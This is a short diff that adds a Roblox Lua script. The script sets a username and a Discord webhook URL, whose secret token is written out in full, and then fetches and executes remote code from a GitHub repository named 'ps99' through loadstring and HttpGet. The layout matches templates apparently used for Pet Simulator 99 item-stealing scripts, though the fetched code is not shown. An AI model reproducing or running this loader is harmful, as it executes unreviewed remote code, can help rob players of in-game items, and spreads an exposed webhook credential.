@@ -1,0 +1,4 @@
+Username = "jhhhhjjjj32" -- << Your Username
+Webhook = "https://discord.com/api/webhooks/1362044321477427270/VQEuM6SrmQRk0OsO-5WZxp-1VPMTtzotNhXDckUqvHkMo56Avr3NpmDXaiJYJzz8enj0" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
